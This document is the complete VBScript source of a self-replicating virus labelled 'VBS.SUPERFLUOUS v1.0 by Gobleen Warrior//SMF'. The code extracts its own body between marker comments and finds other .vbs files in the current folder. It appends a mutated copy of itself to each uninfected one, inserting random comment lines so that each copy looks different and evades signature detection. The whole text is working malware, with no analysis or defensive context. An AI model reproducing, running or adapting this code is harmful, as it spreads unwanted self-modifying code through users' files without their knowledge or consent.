''SPPST
On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set OpenBody = FSO.OpenTextFile (Wscript.ScriptFullName, 1, 0, 0)
Body = OpenBody.ReadAll
OpenBody.Close
Strings = Split (Body, vbCrLf)
For x = 0 To UBound (Strings) Step 1
If Strings(x) = Chr(39) & Chr(39) & "SPPST" Then
Exit For
End If
Next
For x = x To UBound (Strings) Step 1
If Mid (Strings(x), 1, 1) = Chr(39) And Mid (Strings(x), 2,1) <> Chr(39) Then
x = x
Else
ClearBody = ClearBody & Strings(x) & vbCrLf
If Strings(x) = Chr(39) & Chr(39) & "SPPEN" Then
Exit For
End If
End If
Next
Set OurPath = FSO.GetFolder (".")
Set FileList = OurPath.Files
For Each x In FileList
If FSO.GetExtensionName (x) = "vbs" Or FSO.GetExtensionName (x) = "VBS" Then
Set VictimFile = FSO.OpenTextFile (x, 1, 0, 0)
VictimBody = VictimFile.ReadAll
VictimFile.CLose
Infected = False
For y = Len(VictimBody) To 1 Step -1
If Mid (VictimBody, y, 5) = Chr(39) & Chr(39) & "SPP" Then
Infected = True
Exit For
End If
Next
If Infected = False Then
MutateBody = vbCrLf & Mutator (ClearBody)
Set Victim = FSO.OpenTextFile (x, 8, 0, 0)
Victim.Write MutateBody
Victim.CLose
End If
End If
Next
Function Mutator (CodeToMutate)
Strings = Split (CodeToMutate, vbCrLf)
CommentsCount = Cbyte (GetRndNumber(3, UBound(Strings) / 1.5))
CommentPlace = Cbyte (UBound(Strings) / CommentsCount)
y = 0
For b = 0 To UBound(Strings) Step 1
DoMutateBody = DoMutateBody & Strings(b) & vbCrLf
y = y + 1
If y = CommentPlace Then
Comment = MakeComment
DoMutateBody = DoMutateBody & Comment
y = 0
End If
Next
Mutator = DoMutateBody
End Function
Function MakeComment
CommentLenght = Cbyte (GetRndNumber(3, 30))
DoComment = Chr(39)
For z = 1 To CommentLenght Step 1
a = CByte(GetRndNumber (65, 122))
If a < 91 Or a > 96 Then
DoComment = DoComment & Chr(a)
Else
z = z - 1
End If
Next
MakeComment = DoComment & vbCrLf
End Function
Function GetRndNumber (r_a, r_b)
Randomize
r_c = (r_b - r_a) * Rnd + r_a
GetRndNumber = r_c
End Function
''VBS.SUPERFLUOUS v1.0 by Gobleen Warrior//SMF
''Sometimes we considers itself superfluous... In this moments we are right.
''SPPEN